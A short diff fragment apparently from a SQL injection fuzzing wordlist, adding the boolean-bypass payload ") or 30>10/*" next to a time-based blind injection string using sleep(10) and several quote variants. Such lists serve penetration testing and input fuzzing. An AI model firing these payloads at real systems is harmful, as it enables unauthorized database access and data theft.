@@ -5,6 +5,7 @@ if(now()=sysdate()%2Csleep(10)%2C0)
 &lsquo;
 &#39;
 &rsquo;
+') or 30>10/*
 '-'
 ' '
 '&'
